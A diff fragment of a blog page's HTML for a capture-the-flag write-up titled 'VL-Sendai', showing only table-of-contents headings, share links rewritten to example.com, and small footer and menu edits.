<span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS-ESC4-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">ADCS ESC4 Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Alternative-Path-MSSQL-Server-Exploitation"><span class="toc-number">1.12.</span> <span class="toc-text">Alternative Path: MSSQL Server Exploitation</span></a></li></ol></li></ol>
       </div>
     
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/08/VL-Sendai/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&text=VL-Sendai"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&is_video=false&description=VL-Sendai"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=VL-Sendai&body=Check out this article: https://panosoikogr.github.io/2025/04/08/VL-Sendai/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&name=VL-Sendai&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/08/VL-Sendai/&t=VL-Sendai"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/08/VL-Sendai/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/08/VL-Sendai/&text=VL-Sendai"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/08/VL-Sendai/&is_video=false&description=VL-Sendai"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Sendai&body=Check out this article: http://example.com/2025/04/08/VL-Sendai/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/08/VL-Sendai/&title=VL-Sendai"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/08/VL-Sendai/&name=VL-Sendai&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/08/VL-Sendai/&t=VL-Sendai"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -332,7 +348,7 @@
     Copyright &copy;
     
     
-    2016-2025
+    2024-2027
     Panosoiko
   </div>
   <div class="footer-right">
@@ -347,7 +363,7 @@
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
+       --><li><a href="/tags/">tags</a></li><!--
      --><!--
        --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
      -->
